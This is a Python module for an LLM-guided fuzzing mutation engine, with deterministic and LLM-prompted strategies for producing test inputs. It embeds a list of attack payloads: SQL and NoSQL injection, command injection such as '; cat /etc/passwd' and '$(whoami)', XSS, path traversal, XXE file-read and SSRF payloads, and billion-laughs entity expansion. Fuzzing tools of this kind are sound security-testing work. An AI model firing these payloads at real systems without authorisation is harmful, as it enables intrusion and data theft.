"""
LLM-Guided Mutation Engine

Uses LLMs to generate smart, structure-aware mutations for fuzzing.
Instead of random bit-flipping, the LLM understands the input format
and generates targeted mutations that are more likely to trigger
edge cases and vulnerabilities.

Strategies:
    - grammar_aware: Parse structured input (JSON, XML, protobuf) and mutate fields
    - protocol_aware: Mutate network protocol fields based on spec
    - boundary_testing: Generate boundary values for numeric fields
    - injection_testing: Generate injection payloads (SQLi, XSS, command injection)
    - semantic_mutation: LLM generates semantically valid but edge-case inputs
    - crash_guided: Use previous crash info to guide new mutations

Usage:
    from vorsyghta.research.llm_mutator import LLMMutator, MutationStrategy

    mutator = LLMMutator(llm_manager)
    mutations = await mutator.generate_mutations(
        seed_input=b'{"user": "admin", "action": "login"}',
        strategy=MutationStrategy.GRAMMAR_AWARE,
        target_description="JSON API endpoint accepting user login",
        count=50,
    )
"""

import asyncio
import base64
import json
import logging
import random
import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class MutationStrategy(str, Enum):
    """Mutation strategies for LLM-guided fuzzing."""
    GRAMMAR_AWARE = "grammar_aware"          # Parse and mutate structured data
    PROTOCOL_AWARE = "protocol_aware"        # Mutate network protocol fields
    BOUNDARY_TESTING = "boundary_testing"    # Generate boundary values
    INJECTION_TESTING = "injection_testing"  # Generate injection payloads
    SEMANTIC_MUTATION = "semantic_mutation"  # LLM generates edge-case valid inputs
    CRASH_GUIDED = "crash_guided"            # Use crash info to guide mutations
    COMBINED = "combined"                    # Use multiple strategies


@dataclass
class MutationResult:
    """A single generated mutation."""
    input_bytes: bytes
    strategy: MutationStrategy
    description: str = ""
    expected_effect: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    @property
    def input_b64(self) -> str:
        return base64.b64encode(self.input_bytes).decode()

    def to_dict(self) -> dict:
        return {
            "input_b64": self.input_b64,
            "input_size": len(self.input_bytes),
            "strategy": self.strategy.value,
            "description": self.description,
            "expected_effect": self.expected_effect,
            "metadata": self.metadata,
        }


class LLMMutator:
    """
    LLM-guided mutation engine for smart fuzzing.

    Uses the LLM to understand input structure and generate
    targeted mutations that are more likely to find bugs than
    random mutation.
    """

    def __init__(self, llm_manager=None):
        """
        Args:
            llm_manager: LLMManager instance for generating mutations.
                         If None, only deterministic strategies are available.
        """
        self.llm = llm_manager

        # Boundary values for numeric fuzzing
        self._boundary_values = [
            0, 1, -1, 127, 128, 255, 256,
            32767, 32768, 65535, 65536,
            2147483647, 2147483648, 4294967295, 4294967296,
            -128, -32768, -2147483648,
        ]

        # Injection payloads
        self._injection_payloads = [
            # SQL injection
            "' OR '1'='1", "'; DROP TABLE--", "' UNION SELECT NULL--",
            "1; WAITFOR DELAY '0:0:5'--", "' OR 1=1#",
            # NoSQL injection
            "{'$gt': ''}", "{'$ne': null}", "{'$where': '1==1'}",
            # Command injection
            "; cat /etc/passwd", "| id", "$(whoami)", "`id`",
            "& ping -c 10 127.0.0.1", "\n/bin/sh",
            # XSS
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "javascript:alert(1)", "\"><script>alert(1)</script>",
            # Path traversal
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            # Format string
            "%s%s%s%s%s%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n",
            # Buffer overflow patterns
            "A" * 256, "A" * 1024, "A" * 4096, "A" * 65536,
            "\x00" * 256, "\xff" * 256,
            # LDAP injection
            "*(uid=*))(|(uid=*",
            # XML/XXE
            "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        ]

    async def generate_mutations(
        self,
        seed_input: bytes,
        strategy: MutationStrategy = MutationStrategy.COMBINED,
        target_description: str = "",
        count: int = 50,
        previous_crashes: Optional[List[dict]] = None,
    ) -> List[MutationResult]:
        """Generate mutated inputs using the specified strategy.

        Args:
            seed_input: Base input to mutate
            strategy: Mutation strategy to use
            target_description: Description of the target (for LLM context)
            count: Number of mutations to generate
            previous_crashes: Info about previous crashes (for crash_guided)

        Returns:
            List of MutationResult objects
        """
        results: List[MutationResult] = []

        if strategy == MutationStrategy.COMBINED:
            # Use multiple strategies
            strategies = [
                MutationStrategy.GRAMMAR_AWARE,
                MutationStrategy.BOUNDARY_TESTING,
                MutationStrategy.INJECTION_TESTING,
                MutationStrategy.SEMANTIC_MUTATION,
            ]
            if previous_crashes:
                strategies.append(MutationStrategy.CRASH_GUIDED)

            per_strategy = max(count // len(strategies), 5)
            for s in strategies:
                results.extend(
                    await self.generate_mutations(
                        seed_input, s, target_description, per_strategy, previous_crashes
                    )
                )
            return results[:count]

        if strategy == MutationStrategy.GRAMMAR_AWARE:
            results = self._grammar_aware_mutations(seed_input, count)
        elif strategy == MutationStrategy.PROTOCOL_AWARE:
            results = self._protocol_aware_mutations(seed_input, count)
        elif strategy == MutationStrategy.BOUNDARY_TESTING:
            results = self._boundary_mutations(seed_input, count)
        elif strategy == MutationStrategy.INJECTION_TESTING:
            results = self._injection_mutations(seed_input, count)
        elif strategy == MutationStrategy.SEMANTIC_MUTATION:
            results = await self._semantic_mutations(
                seed_input, target_description, count
            )
        elif strategy == MutationStrategy.CRASH_GUIDED:
            results = await self._crash_guided_mutations(
                seed_input, target_description, previous_crashes or [], count
            )
        else:
            results = self._random_mutations(seed_input, count)

        logger.info(
            f"Generated {len(results)} mutations using {strategy.value} strategy"
        )
        return results

    # -----------------------------------------------------------------------
    # Deterministic strategies (no LLM required)
    # -----------------------------------------------------------------------

    def _grammar_aware_mutations(self, seed: bytes, count: int) -> List[MutationResult]:
        """Parse structured input and mutate individual fields."""
        results = []

        # Try JSON
        try:
            data = json.loads(seed)
            results.extend(self._mutate_json(data, seed, count))
        except (json.JSONDecodeError, UnicodeDecodeError):
            pass

        # Try XML
        try:
            text = seed.decode("utf-8", errors="ignore")
            if "<" in text and ">" in text:
                results.extend(self._mutate_xml(text, count))
        except Exception:
            pass

        # If no structured format detected, fall back to field splitting
        if not results:
            # Split on common delimiters and mutate each field
            text = seed.decode("utf-8", errors="ignore")
            delimiters = ["&", "=", "|", "\n", "\r\n", " ", ","]
            for delim in delimiters:
                if delim in text:
                    parts = text.split(delim)
                    for i, part in enumerate(parts):
                        # Replace field with boundary values
                        for bv in self._boundary_values[:5]:
                            mutated = parts.copy()
                            mutated[i] = str(bv)
                            new_input = delim.join(mutated).encode()
                            results.append(MutationResult(
                                input_bytes=new_input,
                                strategy=MutationStrategy.GRAMMAR_AWARE,
                                description=f"Field {i} set to boundary value {bv}",
                                expected_effect="Potential integer overflow or parsing error",
                            ))
                            if len(results) >= count:
                                return results

        return results[:count]

    def _mutate_json(self, data: Any, original: bytes, count: int) -> List[MutationResult]:
        """Mutate JSON fields with edge-case values."""
        results = []

        def mutate_node(node, path=""):
            if isinstance(node, dict):
                for key, val in node.items():
                    new_path = f"{path}.{key}" if path else key
                    mutate_node(val, new_path)
                    # Replace value with edge cases
                    for edge in [None, True, False, "", "A" * 1000, -1, 0, 2147483648, [], {}]:
                        mutated = json.loads(json.dumps(data))
                        try:
                            self._set_nested(mutated, new_path, edge)
                            results.append(MutationResult(
                                input_bytes=json.dumps(mutated).encode(),
                                strategy=MutationStrategy.GRAMMAR_AWARE,
                                description=f"Set {new_path} to {repr(edge)[:50]}",
                                expected_effect="Type confusion or boundary error",
                                metadata={"field": new_path, "value": repr(edge)[:100]},
                            ))
                            if len(results) >= count:
                                return
                        except Exception:
                            pass
            elif isinstance(node, list):
                for i, item in enumerate(node):
                    mutate_node(item, f"{path}[{i}]")

        mutate_node(data)
        return results[:count]

    def _set_nested(self, data: Any, path: str, value: Any):
        """Set a value at a dotted path in nested dict/list."""
        keys = path.replace("[", ".[").split(".")
        keys = [k for k in keys if k]
        current = data
        for key in keys[:-1]:
            if key.startswith("["):
                idx = int(key[1:-1])
                if not isinstance(current, list) or idx < 0 or idx >= len(current):
                    return  # Index out of range — skip this mutation
                current = current[idx]
            else:
                if not isinstance(current, dict) or key not in current:
                    return  # Key not found — skip this mutation
                current = current[key]
        last = keys[-1]
        if last.startswith("["):
            idx = int(last[1:-1])
            if isinstance(current, list) and 0 <= idx < len(current):
                current[idx] = value
        else:
            if isinstance(current, dict):
                current[last] = value

    def _mutate_xml(self, text: str, count: int) -> List[MutationResult]:
        """Mutate XML with XXE and entity expansion attacks."""
        results = []
        # XXE injection
        xxe_payloads = [
            ("<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", "XXE file read"),
            ("<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://127.0.0.1/'>]><foo>&xxe;</foo>", "XXE SSRF"),
            ("<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY a '&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;'>]><foo>&a;</foo>", "Entity expansion (billion laughs)"),
        ]
        for payload, desc in xxe_payloads:
            results.append(MutationResult(
                input_bytes=payload.encode(),
                strategy=MutationStrategy.GRAMMAR_AWARE,
                description=desc,
                expected_effect="XXE vulnerability or DoS",
            ))
            if len(results) >= count:
                break

        # Mutate existing XML attributes
        import re
        attrs = re.findall(r'(\w+)="([^"]*)"', text)
        for attr_name, attr_val in attrs[:10]:
            for payload in self._injection_payloads[:5]:
                mutated = text.replace(
                    f'{attr_name}="{attr_val}"',
                    f'{attr_name}="{payload}"'
                )
                results.append(MutationResult(
                    input_bytes=mutated.encode(),
                    strategy=MutationStrategy.GRAMMAR_AWARE,
                    description=f"XML attribute {attr_name} injected",
                    expected_effect="Injection via XML attribute",
                ))
                if len(results) >= count:
                    return results

        return results[:count]

    def _protocol_aware_mutations(self, seed: bytes, count: int) -> List[MutationResult]:
        """Mutate network protocol fields."""
        results = []

        # HTTP protocol mutation
        try:
            text = seed.decode("utf-8", errors="ignore")
            if text.startswith(("GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "OPTIONS ")):
                results.extend(self._mutate_http(text, count))
        except Exception:
            pass

        # Binary protocol mutation (flip bits in header fields)
        if len(seed) >= 4 and not results:
            for offset in range(min(len(seed), 20)):
                for bit in range(8):
                    mutated = bytearray(seed)
                    mutated[offset] ^= (1 << bit)
                    results.append(MutationResult(
                        input_bytes=bytes(mutated),
                        strategy=MutationStrategy.PROTOCOL_AWARE,
                        description=f"Bit flip at offset {offset} bit {bit}",
                        expected_effect="Protocol parsing error or state confusion",
                        metadata={"offset": offset, "bit": bit},
                    ))
                    if len(results) >= count:
                        return results

        # Length field mutation
        if len(seed) >= 4:
            for offset in [0, 2, 4]:
                if offset + 4 <= len(seed):
                    for length_val in [0, 1, 0xFFFFFFFF, len(seed) * 2, len(seed) + 1000]:
                        mutated = bytearray(seed)
                        struct.pack_into("<I", mutated, offset, length_val & 0xFFFFFFFF)
                        results.append(MutationResult(
                            input_bytes=bytes(mutated),
                            strategy=MutationStrategy.PROTOCOL_AWARE,
                            description=f"Length field at offset {offset} set to {length_val}",
                            expected_effect="Buffer over-read or allocation error",
                            metadata={"offset": offset, "length": length_val},
                        ))
                        if len(results) >= count:
                            return results

        return results[:count]

    def _mutate_http(self, text: str, count: int) -> List[MutationResult]:
        """Mutate HTTP request fields."""
        results = []
        lines = text.split("\r\n")
        if not lines:
            return results

        # Mutate method
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
                   "TRACE", "CONNECT", "PROPFIND", "MKCOL", "COPY", "MOVE",
                   "LOCK", "UNLOCK", "DEBUG", "X" * 100]
        for method in methods:
            parts = lines[0].split(" ")
            if len(parts) >= 3:
                mutated_line = f"{method} {parts[1]} {parts[2]}"
                mutated = "\r\n".join([mutated_line] + lines[1:])
                results.append(MutationResult(
                    input_bytes=mutated.encode(),
                    strategy=MutationStrategy.PROTOCOL_AWARE,
                    description=f"HTTP method changed to {method}",
                    expected_effect="Unhandled HTTP method or verb tampering",
                ))
                if len(results) >= count:
                    return results

        # Mutate path with traversal and injection
        parts = lines[0].split(" ")
        if len(parts) >= 3:
            path = parts[1]
            for payload in ["../../../etc/passwd", "..%2f..%2f..%2fetc/passwd",
                           "/admin", "/.env", "/api/v1/users/../../../admin",
                           path + "?" + "A" * 5000]:
                mutated_line = f"{parts[0]} {payload} {parts[2]}"
                mutated = "\r\n".join([mutated_line] + lines[1:])
                results.append(MutationResult(
                    input_bytes=mutated.encode(),
                    strategy=MutationStrategy.PROTOCOL_AWARE,
                    description=f"HTTP path mutated to {payload[:50]}",
                    expected_effect="Path traversal or routing bypass",
                ))
                if len(results) >= count:
                    return results

        # Add oversized headers
        for header_val in ["A" * 8192, "\x00" * 100, "%n" * 100]:
            mutated = text + f"\r\nX-Custom: {header_val}"
            results.append(MutationResult(
                input_bytes=mutated.encode(),
                strategy=MutationStrategy.PROTOCOL_AWARE,
                description=f"Oversized/custom header added",
                expected_effect="Header parsing buffer overflow",
            ))
            if len(results) >= count:
                return results

        return results[:count]

    def _boundary_mutations(self, seed: bytes, count: int) -> List[MutationResult]:
        """Generate boundary value mutations."""
        results = []

        # Numeric boundary values in various encodings
        for val in self._boundary_values:
            for fmt, size in [("<i", 4), ("<I", 4), ("<q", 8), ("<Q", 8), ("<f", 4), ("<d", 8)]:
                try:
                    packed = struct.pack(fmt, val)
                    # Replace first N bytes with packed value
                    if len(seed) >= size:
                        mutated = seed[size:] + packed
                        results.append(MutationResult(
                            input_bytes=mutated,
                            strategy=MutationStrategy.BOUNDARY_TESTING,
                            description=f"Boundary value {val} as {fmt}",
                            expected_effect="Integer overflow or underflow",
                            metadata={"value": val, "format": fmt},
                        ))
                    if len(results) >= count:
                        return results
                except struct.error:
                    continue

        # Empty and single-byte inputs
        results.append(MutationResult(
            input_bytes=b"",
            strategy=MutationStrategy.BOUNDARY_TESTING,
            description="Empty input",
            expected_effect="Null dereference or uninitialized read",
        ))
        results.append(MutationResult(
            input_bytes=b"\x00",
            strategy=MutationStrategy.BOUNDARY_TESTING,
            description="Single null byte",
            expected_effect="Off-by-one or null termination error",
        ))

        # Repeated patterns at various lengths
        for pattern in [b"\x00", b"\xff", b"A", b"\r\n", b"\n"]:
            for length in [128, 256, 512, 1024, 4096, 65536]:
                results.append(MutationResult(
                    input_bytes=pattern * length,
                    strategy=MutationStrategy.BOUNDARY_TESTING,
                    description=f"{length} bytes of {repr(pattern)}",
                    expected_effect="Buffer overflow at common allocation boundaries",
                    metadata={"pattern": repr(pattern), "length": length},
                ))
                if len(results) >= count:
                    return results

        return results[:count]

    def _injection_mutations(self, seed: bytes, count: int) -> List[MutationResult]:
        """Generate injection payload mutations."""
        results = []
        for payload in self._injection_payloads[:count]:
            # Try injecting at beginning, end, and middle
            for position_name, position_func in [
                ("prepend", lambda s, p: p.encode() + s),
                ("append", lambda s, p: s + p.encode()),
                ("replace", lambda s, p: p.encode()),
            ]:
                results.append(MutationResult(
                    input_bytes=position_func(seed, payload),
                    strategy=MutationStrategy.INJECTION_TESTING,
                    description=f"Injection payload {position_name}: {payload[:50]}",
                    expected_effect="Injection vulnerability (SQLi, XSS, command injection)",
                    metadata={"payload": payload[:100], "position": position_name},
                ))
                if len(results) >= count:
                    return results
        return results[:count]

    def _random_mutations(self, seed: bytes, count: int) -> List[MutationResult]:
        """Generate random bit/byte mutations."""
        results = []
        for _ in range(count):
            mutated = bytearray(seed)
            num_mutations = random.randint(1, max(len(seed) // 10, 1))
            for _ in range(num_mutations):
                if len(mutated) > 0:
                    pos = random.randint(0, len(mutated) - 1)
                    mutation_type = random.choice(["flip", "insert", "delete", "replace"])
                    if mutation_type == "flip":
                        mutated[pos] ^= (1 << random.randint(0, 7))
                    elif mutation_type == "insert":
                        mutated.insert(pos, random.randint(0, 255))
                    elif mutation_type == "delete" and len(mutated) > 1:
                        del mutated[pos]
                    elif mutation_type == "replace":
                        mutated[pos] = random.randint(0, 255)
            results.append(MutationResult(
                input_bytes=bytes(mutated),
                strategy=MutationStrategy.SEMANTIC_MUTATION,
                description=f"Random mutation ({num_mutations} changes)",
                expected_effect="Unknown — random exploration",
            ))
        return results

    # -----------------------------------------------------------------------
    # LLM-guided strategies (require LLM)
    # -----------------------------------------------------------------------

    async def _semantic_mutations(
        self, seed: bytes, target_description: str, count: int
    ) -> List[MutationResult]:
        """Use LLM to generate semantically valid but edge-case inputs."""
        if not self.llm:
            logger.warning("No LLM available, falling back to random mutations")
            return self._random_mutations(seed, count)

        seed_text = seed.decode("utf-8", errors="replace")[:2000]

        prompt = f"""You are a vulnerability researcher generating smart fuzz inputs.

Target description: {target_description}

Seed input:
```
{seed_text}
```

Generate {count} mutated inputs that are:
1. Structurally valid enough to pass initial parsing
2. But contain edge cases likely to trigger bugs (overflows, type confusion, null derefs, etc.)

For each mutation, provide:
- The mutated input
- A brief description of what was changed
- What bug it might trigger

Respond as JSON array:
[
  {{"input": "...", "description": "...", "expected_effect": "..."}},
  ...
]

Focus on:
- Boundary values in numeric fields
- Unexpected types (string where number expected, etc.)
- Oversized fields
- Special characters and encoding edge cases
- Missing or duplicated required fields
- Race condition triggers (duplicate keys, etc.)
"""

        try:
            response = await self.llm.generate_content(
                prompt=prompt,
                scenario_type="vulnerability_research",
                max_tokens=4000,
                temperature=0.8,
            )

            # Parse LLM response
            content = response.content.strip()
            if content.startswith("```"):
                content = content.split("```")[1]
                if content.startswith("json"):
                    content = content[4:]

            mutations = json.loads(content)
            results = []
            for m in mutations[:count]:
                input_bytes = m.get("input", "").encode()
                results.append(MutationResult(
                    input_bytes=input_bytes,
                    strategy=MutationStrategy.SEMANTIC_MUTATION,
                    description=m.get("description", ""),
                    expected_effect=m.get("expected_effect", ""),
                ))
            return results

        except Exception as e:
            logger.error(f"LLM mutation generation failed: {e}")
            return self._random_mutations(seed, count)

    async def _crash_guided_mutations(
        self,
        seed: bytes,
        target_description: str,
        previous_crashes: List[dict],
        count: int,
    ) -> List[MutationResult]:
        """Use previous crash info to guide new mutations toward similar bugs."""
        if not self.llm or not previous_crashes:
            return self._random_mutations(seed, count)

        # Summarize previous crashes
        crash_summaries = []
        for c in previous_crashes[:10]:
            crash_summaries.append({
                "crash_type": c.get("crash_type", "unknown"),
                "stack_trace": c.get("stack_trace", "")[:500],
                "input_hash": c.get("input_hash", "")[:16],
            })

        seed_text = seed.decode("utf-8", errors="replace")[:1000]

        prompt = f"""You are a vulnerability researcher. Previous fuzzing found crashes.

Target: {target_description}

Seed input:
```
{seed_text}
```

Previous crashes found:
{json.dumps(crash_summaries, indent=2)}

Generate {count} new mutations that:
1. Explore variations of the same code paths that caused previous crashes
2. Try different sizes, offsets, and values near the crash-inducing inputs
3. Target the same vulnerability class but with different trigger conditions

Respond as JSON array:
[
  {{"input": "...", "description": "...", "expected_effect": "...", "targeted_crash": "..."}},
  ...
]
"""

        try:
            response = await self.llm.generate_content(
                prompt=prompt,
                scenario_type="vulnerability_research",
                max_tokens=4000,
                temperature=0.7,
            )

            content = response.content.strip()
            if content.startswith("```"):
                content = content.split("```")[1]
                if content.startswith("json"):
                    content = content[4:]

            mutations = json.loads(content)
            results = []
            for m in mutations[:count]:
                input_bytes = m.get("input", "").encode()
                results.append(MutationResult(
                    input_bytes=input_bytes,
                    strategy=MutationStrategy.CRASH_GUIDED,
                    description=m.get("description", ""),
                    expected_effect=m.get("expected_effect", ""),
                    metadata={"targeted_crash": m.get("targeted_crash", "")},
                ))
            return results

        except Exception as e:
            logger.error(f"Crash-guided mutation failed: {e}")
            return self._random_mutations(seed, count)
